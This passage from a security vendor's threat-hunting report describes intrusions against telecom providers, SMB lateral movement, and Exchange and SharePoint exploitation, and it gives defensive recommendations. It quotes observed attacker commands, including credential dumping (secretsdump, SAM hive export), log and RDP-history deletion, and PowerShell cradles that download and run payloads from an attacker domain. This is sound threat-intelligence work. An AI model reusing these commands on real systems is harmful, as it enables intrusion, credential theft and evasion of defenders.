The adversary tipped their hand when they attempted to establish persistence and
took measures to avoid detection and defenses. It is true that legitimate software
may hide installation directories to obscure complexity or prevent accidental user
tampering. However, when stealthy or evasive measures are observed in combination
with the preceding activity, they add further suspicion in the mind of a threat hunter.
In this intrusion, the threat hunter’s suspicions were confirmed by more egregious
attempts to blend in with scheduled task names that masquerade as valid operating
system functions. Finally, excluding Prilex malware directories from Windows Defender
scans confirms the intent for long-term collection operations without interruption.

Conclusion and Recommendations
User-enabled intrusions allow an adversary to bypass some tactics in the MITRE
ATT&CK Matrix. This, however, should not worry diligent threat hunters equipped
with sufficient telemetry and an understanding of both the steps required for
adversary objectives and the footprints that those steps leave behind. The key is
to inhibit adversary progress through effective EDR while putting the indicators
together to recognize the threat and respond to it in a timely manner.
The use of legitimate, non-native remote access tools such as TeamViewer,
AnyDesk or VNC (and its variants) by eCrime actors remains common. In the last
year, such tools were present in about 5% of eCrime intrusion attempts observed
by OverWatch. System administrators would do well to restrict and audit the use of
such tools in their environment, even for authorized use cases. Adversaries have
been known to search for listening ports and stored credentials used by remote
access tools to take advantage of preinstalled lateral movement options.

Signal Interference: Threat
Hunting Short-circuits Adversary
Telecommunications Targeting

O

ver the past year, OverWatch observed a surge in interactive intrusion
activity targeting the telecommunications industry, with the number
of intrusion attempts more than doubling year over year. This activity
spanned all major geographic regions and was tied to a diverse range of adversaries.
This activity was often conducted by China-nexus adversaries but OverWatch also
uncovered operations by Iran-nexus adversaries and other unidentified, but likely
targeted intrusion adversaries.
Targeted intrusion adversaries often conduct operations against telecommunications
providers to fulfill their surveillance, intelligence and counterintelligence collection
priorities. This includes accessing information such as call detail records (CDR) and,
in the case of mobile providers, short message service (SMS) communications. In
some instances, such as the case study in this section, multiple targeted intrusion
adversaries have been found active simultaneously, perhaps unbeknownst to each
other, in the same victim environments.

Tradecraft
Telecommunications providers play a unique and critical role in modern societies.
Most businesses, governments and individuals rely on telecommunications
providers to enable all manner of communication. The centrality and ubiquity of
telecommunications systems make them high-value targets for governments and
criminals worldwide. Targeted intrusion adversaries routinely prove themselves
adept at learning how these systems function and are skilled at navigating Windows,
Linux and Solaris environments.
Common initial access techniques observed in use against the telecommunications
industry include spearphishing, vulnerability exploitation, use of legitimate credentials
and supply chain compromise. Once access has been gained, adversaries often
exploit services or use system-native tools, such as Windows Management
Instrumentation (WMI) and various command and script interpreters, to stage the rest
of their operation.
To maintain access to a victim environment, adversaries regularly and proactively
identify hosts of interest that may create opportunities for credential harvesting and
lateral movement. In many cases, adversaries explore the environment using built-in
tools such as the Windows net command, ping, telnet, SSH, PowerShell and WMI,
among others.

2021 Threat Hunting Report

Once a target host is identified, adversaries have a variety of techniques at their
disposal to acquire user credentials. In Microsoft environments, common credential
harvesting techniques include using Mimikatz,28 dumping LSASS memory (often via
comsvcs.dll or using ProcDump), or altering the WDigest registry key to store
passwords in clear text in memory. In Linux environments, adversaries often view the
contents of sensitive files, such as .bash_history, passwd, shadow, and other
configuration files and administration scripts, when attempting to identify credentials.
OverWatch has also observed adversaries employing more novel techniques. In one
case, an adversary deployed backdoored SSH daemons that included an added ability
to log credentials.29 OverWatch has also seen the use of backdoored web-based login
pages that have been modified to save credentials for later retrieval by the adversary. In
several instances, operators associated with the LightBasin activity cluster30 (tracked
in industry reporting as UNC1945) deployed a pluggable authentication module (PAM)
backdoor to log credentials for subsequent exfiltration.
Targeted intrusion adversaries often employ a variety of bespoke and publicly available
tooling during of their intrusion activity. Web server-based tools, such as Chopper web
shell and reGeorg tunneling tool, are regularly used as an entry point into compromised
environments. Chopper web shell can also be used to conduct reconnaissance,
download additional tooling and execute commands. Web shells can often be deployed
in various web server environments due to their simplicity and cross-platform
compatibility, allowing them to be written in different languages such as ASP, PHP or
JSP. Chopper and other similar web shells such as CKnife and AntSword also enable
adversaries to manage multiple victims from a single interface. This significantly
reduces the effort required to conduct operations against multiple targets.
China-nexus adversary WICKED PANDA often uses a variety of remote access tools
including Cobalt Strike and their own custom software such as Winnti, ShadowPad or
RouterGod to progress their intrusions. The LightBasin cluster has a diverse toolset
that includes a tool referred to as sun4me, which has been deployed as an encrypted
payload using a key derived from the victim's environment and is decrypted by a tool
referred to as STEELCORGI. sun4me's wide-ranging features include:
	
Tools to enumerate the network via SNMP, UDP and different traceroute
mechanisms
	
WHOIS and DNS query tools
	
Exploits for HeartBeat, Java over Remote Method Invocation (RMI), Apache Struts,
Weblogic, Veritas Veritas NetBackup and others
	
Administration interface for MikroTik routers
	
Tools to remotely extract the configuration from Cisco routers
	
Tools to decrypt passwords from Cisco configuration, vncpasswd and cvspass files
	
Tools to monitor activity on the infected host
	
Tools to enumerate remote users and brute force their credentials via SSH
	
Utility tools such as grep, hexdump, shred, compress and uncompress, and various
versions of netcat

30 The term “LightBasin” describes an activity cluster that has conducted operations against the telecom
munications sector since at least 2017. They are skilled at operating in Linux environments.

37

2021 Threat Hunting Report

To capitalize on their access, adversaries must understand the telecommunications
environment in which they operate. Adversaries must know how, when and where
information such as call details and SMS messages are routed and recorded.
OverWatch has observed adversaries viewing administration scripts and database
schemas likely as part of their reconnaissance of telecommunications environments.
An adversary with deep knowledge of a target environment can be difficult to discern
from a legitimate administrator. Experienced threat hunters are vital in helping to
differentiate legitimate administrative activities from those conducted by an adversary.
OverWatch threat hunters routinely interact with the most prolific and capable
adversaries targeting the telecommunications industry. This familiarity ensures
OverWatch hunters have deep insights into adversary behaviors and patterns that
enable them to rapidly detect, respond to and prevent adversaries from carrying out
their campaigns unseen.

Conclusion
Telecommunications organizations not only form part of our critical infrastructure,
they are a repository of sensitive and highly valuable data. For these reasons, the
telecommunications industry is likely to remain a high-value target. OverWatch has
observed adversaries targeting data related to specific persons of interest, in addition
to conducting wholesale exfiltration of database records, possibly in an effort to mask
their specific target.
Despite widespread publicity via high-profile outings and indictments, state-nexus
and criminal adversaries are becoming increasingly brazen in their intrusion efforts.
From late 2020 through the first half of 2021, there were frequent high-profile events
such as the supply chain compromise by Russia-nexus activity cluster StellarParticle,
mass on-premises Microsoft Exchange exploitation by at least eight China-nexus
adversaries, and Pulse Secure Connect VPN exploitation by KEYHOLE PANDA and
another unnamed China-nexus adversary. ECrime actors such as CARBON SPIDER
and PINCHY SPIDER also regularly conducted high-impact ransomware operations in
parallel with the aforementioned targeted intrusions.

2021 Threat Hunting Report

OverWatch Uncovers Double
Trouble in the Wires

I

n the first quarter of 2021, OverWatch unearthed sophisticated intrusion activity
at a telecommunications entity based in the Middle East, Turkey and Africa
(META) region. As detailed above, telecommunications organizations have
long been targeted by state-nexus adversaries focused on downstream customer
targeting and intelligence collection operations. Deeper analysis of the observed
TTPs revealed that the victim organization was being targeted simultaneously
by two distinct threat actors. Notably, there appeared to be concurrent targeted
intrusions and criminally motivated intrusions underway.
These two threat actors were observed conducting actions on objectives across a
selection of both Linux- and Windows-based hosts. The tradecraft observed in the
organization’s Linux environment overlaps with previously observed activity tracked by
CrowdStrike Intelligence as part of the LightBasin activity cluster. While CrowdStrike
has not attributed a specific geographical origin to LightBasin, the activity has
been assessed with moderate confidence as being consistent with targeted
intrusion operations. In contrast, the activity observed in the organization’s Windows
environment is suspected to have been carried out by an eCrime actor.

In both environments, OverWatch observed the use of multiple valid accounts,
including the root account on Linux and a kit bag of domain and backdoored local
accounts on Windows.
In addition to broad reconnaissance and information collection operations,
OverWatch identified the deployment of an extensive array of actor tooling. Among
these tools were a selection of remote administrative utilities, which suggested that
establishing and maintaining multiple methods of persistent remote access to the
victim environment was a core mission objective.
Both actors diligently attempted to evade detection and conceal their operations. In
particular, OverWatch routinely observed them operating from hosts without Falcon
sensor coverage. There is risk when endpoints or other devices are not covered by
Falcon, and therefore CrowdStrike strongly encourages the widest possible use of
Falcon sensors throughout the environment.

The Hunt for Sensitive Information
Harvesting and collecting sensitive information, including user credentials, is a
common mission objective observed in targeted intrusion operations against
telecommunications entities. The activity observed by OverWatch throughout this
intrusion attempt serves as a reminder that eCrime adversaries also see value in the
collection of such sensitive information, often in support of efforts to broaden their
reach.
OverWatch observed the likely eCrime actor deploying secretsdump.exe, a publicly
available credential dumping tool that they used in an attempt to dump LSA secrets32
on a highly sensitive server using the following command:
secretsdump.exe

./[REDACTED]@[REDACTED] -hashes [HASH]:[HASH]

This attempt was thwarted by the Falcon sensor, ultimately leaving the actor
empty-handed. However, the command itself is noteworthy, as it revealed that they
were likely in control of another privileged account for which they supplied the
NTLM hash and attempted to dump credentials on a CyberArk server. Continuing
their determined, albeit unsuccessful attempts to harvest credential information
from various hosts, the actor went on to use reg.exe in an attempt to save off the
Security Account Manager33 (SAM) registry hive using the below command:
reg save hklm\sam sam.out
But once again, the actor’s plans were quashed by the Falcon sensor, which
prevented the attempted credential dumping. Shifting their attention, they began
seeking out potentially sensitive files on the host, using notepad.exe to view
several files of interest, including text files likely to contain credential related
information.
C:\Program Files\Notepad++\notepad++.exe"
"\\[REDACTED]\[REDACTED]\credentials.txt
Continuing with the information collection operations, the actor again caught the
watchful eye of OverWatch threat hunters when they were discovered viewing image
files created by a previously identified backdoor that had been deployed on the host.
C:\PerfLogs\SmartAudio.exe
CrowdStrike Intelligence’s analysis of the backdoor — identified as a custom
PyInstaller executable — revealed that the tool included the capability to take a
screen capture34 each time the active foreground window text changed on the victim
host. The resulting screen captures were written to %APPDATA% with the file name
%Y_%m_%d_%H_%M_%S.png. The actor was subsequently identified using
mspaint.exe to view the screen captures created by the above tool.
"C:\Windows\system32\mspaint.exe"
"\\[REDACTED]\c$\Users\[REDACTED]\AppData\Roaming\[REDACTED].png"

2021 Threat Hunting Report

FEATURED TECHNIQUE:
SCREEN CAPTURE/COLLECTION
How this technique works: After gaining initial access, adversaries often shift to
reconnaissance and information discovery operations, which commonly include
attempts to gather sensitive or credential-related information. The screen capture
technique allows for the capture of sensitive information from a victim’s desktop
by taking a single screen capture at a point in time, or scheduling them at regular
intervals. Screen capture can be done by abusing existing system features or
using native or legitimate utilities. Alternatively, as was observed in this intrusion,
adversaries may use custom tooling to conduct screen capture activity. The
resulting captures are typically written to disk in a number of image file formats, and
often followed by collection and archival operations in preparation for exfiltration.
Why attackers use it: The screen capture technique provides adversaries with
the means of collecting a rich and often limitless source of sensitive information
displayed on a victim’s desktop. This can include banking information, unprotected
credential and login information stored in files, process information and even the
contents of emails and instant messaging communications.
What threat hunting delivers: Preventing adversaries from using the screen
capture technique presents a unique challenge for defenders who rely solely on
technology-based controls, as the technique takes advantage of an inherent abuse
of system resources. In contrast, human-led threat hunting looks at the behaviors
and activities associated with malicious screen capture activity, including the
writing of image files to disk, the deployment and execution of file compression and
archival utilities, and anomalous traffic to unknown external hosts that may indicate
potential exfiltration activity.

BYO SSH Keys: Persisting Linux Access
LightBasin was observed by OverWatch operating under the root account to
move laterally between Linux hosts using SSH. The use of the root account was
indicative of an actor that was likely already significantly entrenched in the victim
organization's network. Despite this, the actor continued to take additional steps to
ensure they were able to maintain their access. Notably, OverWatch threat hunters
observed LightBasin manipulating the SSH authorized_keys file.35
The abuse of SSH keys is a commonly seen persistence method used to preserve
access. In this case, the actor was discovered tampering with the authorized_keys
file, likely adding their own malicious SSH keys to the file before overwriting it. Once
this operation was complete, the actor used the touch command to timestomp36 the
authorized_keys file, thereby modifying the file’s timestamp.

Likely eCrime Actor Deploys Arsenal of Remote
Administration Tools
The extensive array of tooling that the eCrime actor deployed serves as a stark
reminder of the lengths to which criminal actors will go to maintain unfettered
access to a victim organization's network. OverWatch identified the actor deploying
a collection of remote administration tools, all of which were written to the common
staging directory C:\PerfLogs. These included the TeamViewer QuickSupport tool,
CloudBerry Remote Assistant and the Ammyy Admin Remote Desktop software:
C:\PerfLogs\AA_v3.exe
C:\PerfLogs\TeamViewerQS.exe
C:\PerfLogs\RemoteDesktopSetup_v2.4.1.19_netv4.5.1_c5D60E86D.exe

Diligence in Maintaining Stealth
Both threat actors diligently cleared artifacts, concealing their operations while
conducting actions on objectives. OverWatch also observed the use of at least five
distinct defense evasion techniques across both Windows and Linux hosts, aimed
at ensuring the actors could conduct their operations without catching the eye of
defenders.
Additionally, LightBasin was observed on several occasions operating from hosts
without the Falcon sensor installed. This was significant, as it indicated a high
degree of situational awareness with respect to the victim organization’s network
and deployed security controls. It also suggested to OverWatch threat hunters that
LightBasin was likely aware of the presence of the Falcon sensor.
As LightBasin moved laterally between Linux hosts via SSH, they repeatedly
attempted to tamper with logs in order to remove evidence of their activity. In one
such example, OverWatch threat hunters identified the use of the anti-forensic tool
LOGBLEACH, an ELF utility used to clear logs and prevent analysis. Execution of the
following command resulted in the clearing of specific log files using rm -rf.
Command line example:
orcld -yCa
LightBasin actors continued their cleanup efforts, deleting the LOGBLEACH
tool once they were done, via the command rm -f orcld. They were also seen
executing commands via bash, appended with the HISTFILE=/dev/null string,
allowing for the execution of commands via Bash without writing command history
to the .bash_history file.

42

2021 Threat Hunting Report

Separately, OverWatch observed the probable eCrime actor conducting concerted
defense evasion efforts across several Windows-based hosts within the victim’s
environment. After moving between hosts using WMI and RDP, the actor attempted
to conceal their lateral movement by deleting their RDP connection history. Using
the following commands, the actor used reg.exe to delete two specific registry
keys:
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server
Client\Default" /va /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server
Client\Servers" /f
The “Default” key stores the history of the most recent 10 RDP connections on the
host, while the “Servers” key contains a list of all RDP connections that have been
made from the host, including the username that was used to connect.
Similar to log clearing operations observed on Linux hosts, the actor also attempted
to delete various Windows logs using the following command:
cmd /c del /f *.log
Continuing the evasive techniques on Windows, among the selection of tooling
deployed by the actor were three keyloggers, each of which were named so as to
masquerade37 as a legitimate executable:
C:\Users\[REDACTED]\Documents\Cloudstrike.exe
C:\Users\[REDACTED]\Documents\Symantec.exe
C:\PerfLogs\Chrome.exe

Conclusion and Recommendations
For the past three years, telecommunications organizations have featured
prominently in the top five most heavily targeted verticals, as observed by
OverWatch. They remain a rich target of choice not only for state-nexus actors
focused on information collection objectives, but also, as seen here, for criminal
actors citing the opportunity for large-scale eCrime operations and the potential
for a lucrative payoff. Despite concerted efforts to evade the Falcon sensor, the
actors in this case were unable to escape the watchful eye and continuous vigilance
provided by OverWatch’s 24/7/365 human-driven threat hunting operations.
Several features of this intrusion would likely cause challenges for defenders reliant
only on technology-based controls — in particular, having threat actors deeply
entrenched in the victim environment, possessing a vast array of compromised
and privileged accounts, and using collection techniques such as screen capture.
OverWatch effectively bridged the gap for the victim organization, arming defenders
with the vital visibility and timely actionable intelligence that enabled them to take
action and disrupt the stealthiest of tradecraft.

37 https://attack.mitre.org/techniques/T1036/004/

43

2021 Threat Hunting Report

To combat the abuse of valid accounts, defenders should maintain strict user
and privileged account management practices including avoiding the use of
default accounts, regularly auditing account permissions, deploying multifactor
authentication and employing the concept of least privilege. Defenders should also
avoid storing any sensitive or credential-related information in unencrypted files,
and consider disabling access to the Windows registry editor to protect against
malicious registry modification such as the deletion of registry keys. On Linux hosts,
auditing of .bash_history can help to surface indications of anomalous activity,
and defenders may consider modifying sshd_config to restrict SSH access to
only privileged users. Finally, the importance of continuous proactive threat hunting
cannot be overstated, and it should be deployed alongside technology-based
controls to provide defenders with the vital last line of defense against the
stealthiest of TTPs.

Quick-thinking Hunters Sound the Alarm on Suspicious
SMB Activity
OverWatch uncovered a burst of suspicious reconnaissance activity under a Windows
service account. Hunters recognized the format of this activity as being consistent
with the use of the Smbexec tool.
Originally designed as a penetration testing tool, Smbexec enables covert execution
by creating a Windows service that is then used to redirect a command shell
operation to a remote location over Server Message Block (SMB) protocol. Once the
operation has been performed, the result is transferred back to the source via SMB
and the service is deleted.
The benefit of this approach is that the adversary can perform command execution
under a semi-interactive shell and run commands remotely via a Windows service,
which is less likely to arouse defenders’ suspicions or trigger automated detections.
Further, because the data transfer is performed entirely over SMB, it does not leave
any remote procedure call (RPC) indicators.
The following command shows the Smbexec request that OverWatch threat hunters
saw. In near real time, hunters accurately distinguished this command from otherwise
benign SMB activity. The request echoes a malicious script into a separate batch
file before being executed and deleted. It is run via a Windows service and executed
within the C$ administrative share,39 with the result being returned via SMB.
C:\Windows\system32\cmd.exe /Q /c echo cmd /c

C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c
C:\Windows\TEMP\execute.bat & del C:\Windows\TEMP\execute.bat
The adversary used this technique to execute multiple scripts and commands to
perform reconnaissance in the victim environment. The contents of one of the
attacker’s scripts is shown below — this was an attempt to perform Active Directory
host enumeration via PowerShell.40
powershell -exec bypass -command "Get-ADComputer
-Filter * -Properties ipv4Address, OperatingSystem,

2021 Threat Hunting Report

FEATURED TECHNIQUE:
REMOTE SERVICES — SMB/WINDOWS ADMIN SHARES
How this technique works: SMB is a network protocol used within Windows
environments to enable interaction between file shares and to perform read/write
operations or data transfer between endpoints. Some network share locations are
only available to users with higher privileges, such as C$, ADMIN$ and IPC$. An
adversary with access to an administrator account is able to locally or remotely
connect to these locations and enumerate the shares or perform malicious file
transfer or execution using SMB and RPC.
Why attackers use it: SMB is available in all Windows environments. Adversaries
can leverage the protocol to communicate with administrator shares for lateral
movement, discovery and file execution. Adversaries will target administrator shares
to store malicious files and pivot by executing commands on remote systems.
In some cases, adversaries may use the “Pass the Hash” technique to access
administrator shares with password hashes alone. SMB is also a valuable protocol
for attackers to use during file transfer and command execution because it can
be challenging to analyze SMB communication. Isolating malicious instances with
technology alone can be difficult and unreliable.
What threat hunting delivers: Most of the activity involving this technique will
be benign, everyday network activity, but hunters can start to pull the thread that
may lead to the discovery of an adversary. Threat hunters proactively investigate
lateral movement activity, enriched by contextual system events. For example,
administrators frequently use the legitimate net.exe utility to map network shares,
which by itself is expected activity. However, when observed alongside a connection
from a remote machine, multiple transfer events, service creation events or
scheduled task execution, this may indicate unauthorized access.

SILENT CHOLLIMA Unleashes a Barrage of
Custom Tooling
As OverWatch continued to investigate the reconnaissance activity, the adversary
used Smbexec to remotely copy low-prevalence executables to disk and execute
them. Collaboration between OverWatch and CrowdStrike Intelligence led to a quick
determination that the files were an updated variant of Export Control, a malware
dropper uniquely tied to SILENT CHOLLIMA.
This determination was made based on the behavior of the Export Control dropper,
which operates by decrypting and executing shellcode that is embedded within
the Export Control files resources. A library function can be modified to run the
malicious shellcode, and in this case the modified function was _setmbcpy.
The shellcode is then subsequently decrypted using a custom RC4 cipher
implementation before it is loaded into memory and executed. In this instance,
SILENT CHOLLIMA used this technique to load two further custom tools for
post-compromise actions on objectives.

47

2021 Threat Hunting Report

They started by deploying an information stealer named GifStealer, which runs a
variety of host and network reconnaissance commands and archives the output
within individual compressed files. The header of each file is appended with “.gif”
to appear as a Graphics Interchange Format (GIF) image and is then added into a
compressed archive41 with a pseudo random name, as seen in the example below.
C:\Windows\Temp\~62CEH72K.tmp
Next, the adversary used a separate Export Control dropper to load Valefor, a
remote access tool (RAT) that SILENT CHOLLIMA developed for post-compromise
activity. Valefor uses Windows API functions and utilities to enable file transfer and
data collection capabilities.
Threat hunters discovered the Valefor trojan using a svchost process to perform
beaconing and file access from a hard-coded C2 URL through PowerShell, as seen below.
powershell -exec Bypass -noP "while ($true) { $w=(New-Object
System.Net.WebClient).DownloadString('[REDACTED]'); echo $w;exit}"
OverWatch continued to alert the victim organization to the developing situation and
the emerging attribution to SILENT CHOLLIMA.

Increased Visibility Unearths Further Adversary Activity
OverWatch worked with the victim to ascertain the full scope of adversary activity
within the victim environment by expanding the rollout of the Falcon sensor.
OverWatch increased the organization's coverage and visibility into the intrusion
through this rollout, ultimately uncovering adversary activity on six additional hosts.
OverWatch observed the adversary using Smbexec to remotely perform a wide
range of host and network reconnaissance activity from an internal host. The
adversary again acquired an Export Control dropper to disk in preparation for
GifStealer and Valefor installation, but this time they used a different Valefor variant,
which contacted an alternative C2 infrastructure, potentially as a backup in case of
any issues with the initial variant or C2 domain.
OverWatch then discovered a service creation42 event that was configured to
execute the Export Control loader every time the system reboots. Adversaries will
often use techniques such as establishing rogue services or adding registry keys to
maintain persistence if they temporarily lose connection to the host.
sc create [REDACTED] type= own type= interact start= auto error=
ignore binpath= "cmd /K start C:\Windows\Resources\[REDACTED].exe"
The adversary attempted to evade detection by storing their Export Control
droppers and archived reconnaissance data within legitimate local directories43 in an
effort to masquerade the file as benign. The directories used by SILENT CHOLLIMA
during this intrusion are listed below.
C:\Windows\Resources\

The adversary was also mindful to remove traces of the collected GifStealer
archives by deleting them,44 in addition to overwriting the GifStealer binary itself
using the string below. CrowdStrike Intelligence has also linked this technique to the
SILENT CHOLLIMA adversary.
"C:\Windows\system32\cmd.exe" /c ping -n 3 127.0.0.1 >NUL & echo
EEEE > "C:\Windows\Temp\[REDACTED]"
Throughout this intrusion, OverWatch threat hunters relayed their findings to the
victim to support their containment efforts and removal of SILENT CHOLLIMA from
the network. Threat hunters followed the OverWatch SEARCH methodology to its final
step — hone — and ensured that the new findings from the intrusion-informed hunting
and detections logic were shared across all OverWatch customer sensors worldwide.

Conclusion and Recommendations
The OverWatch team exposed multiple signs of malicious tradecraft in the early
stages of this attack, ultimately leading to the identification and removal of SILENT
CHOLLIMA from the victim’s environment. The expertise and experience of
OverWatch hunters proved instrumental in quickly discerning malicious SMB activity
in the victim environment. Further hunting activity uncovered a trove of custom
tooling that aided rapid attribution efforts by CrowdStrike Intelligence.
In this instance, OverWatch worked with the victim organization to rapidly expand
Falcon sensor coverage to the rest of its environment to support identification of
the adversary on additional hosts. Though the Falcon sensor can be deployed and
operational in just seconds, OverWatch strongly recommends that defenders roll out
endpoint protection consistently and comprehensively across their environment from
the start to ensure maximum coverage and visibility for threat hunters. OverWatch
routinely sees security blind spots become a safe haven from which adversaries can
launch their intrusions.
For defenders concerned about this type of activity, OverWatch also recommends
monitoring service account activity and strictly limiting access to those who require it. In
this intrusion, SILENT CHOLLIMA was able to operate under a service account to gain
interactive access to various hosts. Adversaries will often use these local accounts as a
means to move laterally, escalate privileges or persist within an environment.
During this intrusion, Smbexec played a significant role in enabling SILENT
CHOLLIMA to operate covertly, using services to relay malicious SMB commands.
Although SMB is a legitimate protocol and mostly used for benign activity, it is
essential to hunt for malicious services involving SMB. One example is to search
among new service creation events within Windows event logs (Event ID 7045).
In addition, defenders should investigate instances of remote users connecting
to administrator shares and also hunt for commands or tools that can be used to
connect to network shares. Finally, SMB ports 445 and 139 should not be exposed
to the internet, a simple measure that can thwart common exploit attempts.

Stopping Breaches Is a Race
Against the Clock

F

alcon OverWatch’s mission is to expose advanced interactive threats,
wherever they may hide. OverWatch supports security teams around
the world by delivering context-rich alerts in near real time. These alerts
enable security responders to act quickly and decisively against live threats in their
environment. But finding the threat is only half the battle — it is crucial that defenders
contain and remediate the threat quickly before any damage can be done.
The case studies that follow illustrate what can be achieved when security responders
work hand-in-glove with OverWatch to rapidly contain and remediate malicious
activity. CrowdStrike Falcon Complete™ is a comprehensive managed detection and
response (MDR) service with analysts who actively monitor and manage customers’
Falcon platform on their behalf and deliver full remediation. Falcon Complete
leverages OverWatch threat hunting to quickly identify stealthy threat actors operating
in customers’ environments before containing, disrupting and eradicating them.

OverWatch Disrupts Microsoft Exchange Zero-Day
Exploits With Falcon Complete
In late February 2021, OverWatch began detecting the first signs of a novel intrusion
campaign exploiting zero-day vulnerabilities affecting Microsoft Exchange servers.
OverWatch identified an unknown threat actor gaining unauthorized access to
on-premises Microsoft Exchange application pools across multiple customer
environments. OverWatch issued immediate alerts to affected organizations about this
active threat. Threat hunters then quickly teamed up with Falcon Complete to begin
deeper analysis and investigation into the nature of the activity.
Hunters initially noticed suspicious command line activity running under a parent
process of w3wp.exe, which was indicative of web shell behavior. OverWatch
flagged the activity originating from the w3wp.exe process as malicious when
hunters observed an attempt to exploit the Exchange application pool named
MSExchangeOWAAppPool. Falcon Complete’s subsequent analysis revealed that this
web shell had similarities with a China Chopper-like web shell. The below command
was seen across multiple organizations that were impacted by the campaign. It
attempts to delete the administrator account from the “Exchange Organization
administrators” group in a likely attempt to deny legitimate administrators from being
able to thwart their actions.
Cmd /c cd /d “C:\inetpub\wwwroot\aspnet_client\system_web”&net
group “Exchange Organization administrators” administer /del /
domain& echo [S] &cd & echo [E]

46 For further detail on 2020’s most commonly seen exploints, check out the 2021 CrowdStrike Global
Threat Report.

51

2021 Threat Hunting Report

During 2020, the CVE-2020-0688 vulnerability45 impacting Microsoft Exchange
servers was among the exploits most commonly observed by CrowdStrike.46 Falcon
Complete first thought that this latest activity was a resurgence of exploits against
this known vulnerability and began its investigation on that basis. However, analysts
very quickly realized that there was no forensic evidence to link this latest campaign to
the CVE-2020-0688 vulnerability.
Through pattern analysis of IIS web logs and Microsoft Exchange ECP Server logs, Falcon
Complete identified a pattern of activity exploiting the Get-OabVirtualDirectory and
the Set-OabVirtualDirectory commands. Threat actors were using these commands
to write an ASPX-based China Chopper-like web shell into an Offline Address Book (OAB)
virtual directory. The threat actors would then use that web shell for follow-on command
execution. This exploit chain has since been confirmed as ProxyLogon.47
Prior to Microsoft releasing the ProxyLogon patches, Falcon Complete responded to
and remediated all exploitation and re-exploitation incidents observed in its customers'
environments. This was done via network containment, and the removal of all web shells
and any additional adversary artifacts via remote response tools built into the Falcon
platform. After the release of the patches, Falcon Complete advised its customers of the
urgent need to patch while continuing to protect their environments 24/7.

Security Is a 24/7 Job
OverWatch observed hundreds of instances of Microsoft Exchange exploitation between
Feb. 27, 2021 and March 4, 2021. CrowdStrike observed at least six China-nexus
adversaries attempting to conduct post-exploitation operations following successful
exploitation. In cases where the customer was not subscribed to Falcon Complete,
OverWatch saw some security teams struggle to deliver the round-the-clock rapid
response required to manage an unpatched vulnerability. In such cases, OverWatch
continued to track the activity as adversaries deployed remote access malware,
conducted broad host and user-based reconnaissance operations, and attempted
lateral movement, continuing to escalate the new activity to the victim organization.
ProxyLogon was a rare cybersecurity event: mass exploitation of Microsoft Exchange
servers by multiple alleged state-nexus adversaries, enabled by a variety of zero-day
exploits. The combined expertise of OverWatch and Falcon Complete helped protect
CrowdStrike customers from these exploits prior to their public announcement. The
exploitation of vulnerable public-facing applications and services remains a prominent
intrusion theme, and one that shows no signs of abating as organizations across all
verticals continue to grapple with basic security hygiene and patch management.
Organizations must employ strict patch management and enforce robust user and
password controls, coupled with robust privileged access management practices
while ensuring an appropriate level of scrutiny and caution is applied for all externally
accessible services.

SharePoint Exploitation Becomes a Tale of
Two Outcomes
In today’s fight against globally diffuse and increasingly fast-moving cyber threats,48
organizations need to be prepared to respond quickly to security events. OverWatch’s
continuous hunting ensures that threats don’t go undetected whenever they strike.
Equally important, though, is the speed of the response to those alerts to disrupt the
adversary at the earliest possible opportunity. The next story examines the outcomes of
a rapid response, remediation and investigation by Falcon Complete that began within
just five minutes of receiving an OverWatch alert. It goes on to explore what happened
just a day later when the same adversary had more time to pursue their actions on
objectives at a different organization that was not a Falcon Complete customer.
In the second half of 2020, OverWatch found evidence of an active intrusion by WICKED
PANDA against a Falcon Complete customer in the professional services industry. WICKED
PANDA had exploited a multi-tenant IIS web server and used the below PowerShell
command to download and execute a malicious payload under the IIS worker process.
powershell -w hidden -ep bypass -c IEX(new-object
System.Net.WebClient).DownloadString('https[:]//msettings[.]
dnset[.]com/.dod/rund.txt')
Falcon Complete responded within five minutes of OverWatch’s alert on the initial activity,
quickly contained the host in accordance with the agreed standard operating procedures
and recovered valuable artifacts to support a deeper investigation. Initial analysis of the
affected host revealed that it was a SharePoint 2013 server. Falcon Complete was also able
to pinpoint which of the customer’s websites had been exploited.
Falcon Complete recovered a copy of rund.txt, a PowerShell script that WICKED PANDA
had used to download a next-stage loader executable and a Cobalt Strike Beacon payload.
These artifacts had been dropped into the directory C:\Windows\Temp with the names
System.Web.Services.dll and System.Web.Services.tlb, respectively.
Analysis of rund.txt found that prior to downloading the payload, the script checked
the version of the .NET framework installed on the compromised host and downloaded
the corresponding payload. The script then executed the downloaded DLL using the
native Windows utility InstallUtil.exe.49
InstallUtil.exe /logfile= /LogToConsole=false /U
C:\Windows\Temp\System.Web.Services.dll
Falcon Complete traced the activity to the IIS logs and determined the activity was
exploiting the well-known SharePoint remote code execution (RCE) vulnerability
CVE-2019-0604.50 One of the remnants specific to this exploit is the below call to
this ASPX page.

Working in tandem, OverWatch and Falcon Complete stopped this intrusion in its tracks
and prevented WICKED PANDA from gaining a foothold in the environment. Falcon
Complete began responding within 5 minutes, fully triaged and remediated the host within
1.5 hrs, and the customer began patching within 5 hours of the OverWatch alert.

Examining the Counterfactual
Just one day later, OverWatch uncovered WICKED PANDA attempting the same
activity at another victim organization. This time, the actor executed a PowerShell
command that included the distinctive command alias “kaspersky” as shown below.
powershell set-alias -name kaspersky -value
Invoke-Expression;kaspersky(NewObject Net.WebClient).
DownloadString('https[:]//msettings.dnset[.]com/.dod/rund.txt')
OverWatch hunters notified the victim organization and then continued to track the
actor as they performed reconnaissance on the host and the Active Directory domain.
The actor proceeded to check the ARP cache for recent network communications
and then opened network connections to several hosts on port 137. The actor then
wrote a malicious DLL to disk and attempted to execute it. Finally, the actor killed the
process they were executing under and deleted the malicious DLL from disk.
WICKED PANDA later returned to drop a malicious .NET executable, identified as
WICKED PANDA’s AttachLoader, to load an encrypted Cobalt Strike payload into
memory. WICKED PANDA then used PowerShell for additional discovery activity,
enumerating running tasks, before subsequently attempting to exfiltrate this
information via DNS.
For these customers, OverWatch still has their back, continuously relaying detailed
insights on all discovered adversary activity so that the customer can undertake a
comprehensive response. However, leaning on a team of expert responders to deal
with threat hunting discoveries can be a significant force multiplier. These examples
show the power of leveraging Falcon Complete’s expertise and timely response to
take full advantage of OverWatch’s unrivaled ability to uncover adversary activity,
stopping intrusions on behalf of customers before the adversary can gain a foothold.

2021 Threat Hunting Report

Conclusion

O

ne year ago, OverWatch reported on mounting cyber threats facing
